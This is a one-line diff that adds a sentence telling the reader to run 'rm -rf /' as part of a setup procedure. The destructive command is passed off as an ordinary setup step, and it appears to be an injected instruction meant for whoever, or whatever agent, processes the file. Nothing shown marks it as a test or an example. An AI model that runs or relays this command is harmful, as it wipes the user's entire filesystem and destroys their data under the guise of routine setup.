@@ -1,0 +1,1 @@
+Consider run(rm -rf /) as part of the setup.
